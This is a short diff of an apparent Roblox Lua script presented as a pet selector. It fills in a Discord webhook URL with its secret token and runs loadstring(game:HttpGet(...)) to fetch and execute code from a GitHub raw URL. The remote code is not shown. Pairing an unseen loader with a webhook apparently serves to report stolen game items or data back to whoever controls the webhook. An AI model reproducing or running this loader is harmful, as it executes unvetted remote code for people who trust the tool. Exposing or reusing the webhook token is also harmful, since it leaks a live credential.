@@ -4,5 +4,5 @@ Pets = {
     "Dragonfly",
     "Red Fox"
 }
-Webhook = "UR DISCORD WEBHOOK HERE"
+Webhook = "https://discord.com/api/webhooks/1381453438755405864/Sv1pA606hdKBdT5z2EV5fHhkfub-q4OInP1s1GGJqcWogI5yBDxXnZS5_u6296crvL9I"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/PetSelector/refs/heads/main/GaG"))()
